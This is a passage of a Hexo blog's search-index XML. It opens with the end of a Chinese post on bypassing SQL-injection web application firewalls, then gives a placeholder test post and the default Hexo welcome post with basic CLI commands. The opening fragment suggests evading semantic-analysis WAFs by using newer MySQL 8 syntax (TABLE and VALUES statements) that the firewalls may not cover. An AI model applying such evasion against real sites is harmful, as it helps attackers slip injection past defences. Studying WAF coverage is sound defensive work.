title="语义分析"></a>语义分析</h3><p>这是最高级的方式，模仿MySQL对SQL的分析，waf对用户的输入进行语法语义分析，如果符合MySQL的语法，就判断为SQL注入从而阻断</p><p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p><p>例如我们上面说的MySQL8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/blogs/test/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/blogs/test/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p><img src="/blogs/test/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/blogs/uncategorized/hello-world/"/>
    <url>/blogs/uncategorized/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
